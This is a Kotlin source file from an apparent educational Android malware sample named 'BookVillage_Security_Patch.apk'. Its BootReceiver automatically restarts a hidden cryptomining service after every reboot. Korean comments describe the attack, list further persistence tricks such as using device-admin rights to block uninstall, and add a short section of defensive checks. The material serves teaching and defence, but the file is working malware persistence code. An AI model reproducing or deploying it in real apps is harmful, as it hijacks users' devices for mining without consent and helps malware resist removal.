package com.bookvillage.malware

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat

/**
 * ══════════════════════════════════════════════════════════════════════
 *  [Phase 5] 영구적 백그라운드 제어 - BOOT_COMPLETED BroadcastReceiver
 *  BookVillage_Security_Patch.apk 내부 지속성 컴포넌트
 * ══════════════════════════════════════════════════════════════════════
 *
 * 공격 구조:
 *   - android.intent.action.BOOT_COMPLETED 브로드캐스트 수신
 *   - 기기 재부팅 완료 시 자동으로 MiningService(ForegroundService) 시작
 *   - 사용자가 앱을 삭제하지 않는 한 재부팅 후에도 채굴 재시작
 *   - 사용자 개입 없이 영구적으로 CPU 자원 착취
 *
 * 실제 공격에서 추가 지속성 기법:
 *   - JobScheduler: 주기적 작업 스케줄링 (배터리 최적화 우회)
 *   - AlarmManager: 반복 알람으로 서비스 재시작
 *   - DeviceAdminReceiver: 기기 관리자 권한 획득 시 삭제 차단
 *
 * 방어 방법:
 *   - 설정 > 앱 > [앱명] > 권한 에서 '자동 시작' 비활성화
 *   - adb shell pm list receivers | grep BOOT_COMPLETED
 *   - adb shell am broadcast -a android.intent.action.BOOT_COMPLETED (테스트)
 *   - 백신 앱: BOOT_COMPLETED 등록 앱 모니터링
 * ══════════════════════════════════════════════════════════════════════
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BVSecurityPatch"
    }

    override fun onReceive(context: Context, intent: Intent) {
        // BOOT_COMPLETED 또는 QUICKBOOT_POWERON(일부 단말) 수신 시 서비스 시작
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == "android.intent.action.QUICKBOOT_POWERON") {

            Log.d(TAG, "[Phase 5] BOOT_COMPLETED 수신 - 채굴 서비스 자동 재시작")

            val serviceIntent = Intent(context, MiningService::class.java)

            // Android 8.0(Oreo)+ 에서는 백그라운드 서비스 제한으로
            // startForegroundService()를 사용해야 함
            // → ForegroundService이므로 제한 우회 가능
            ContextCompat.startForegroundService(context, serviceIntent)

            Log.d(TAG, "[Phase 5] MiningService 재시작 완료 - 영구 채굴 지속")
        }
    }
}
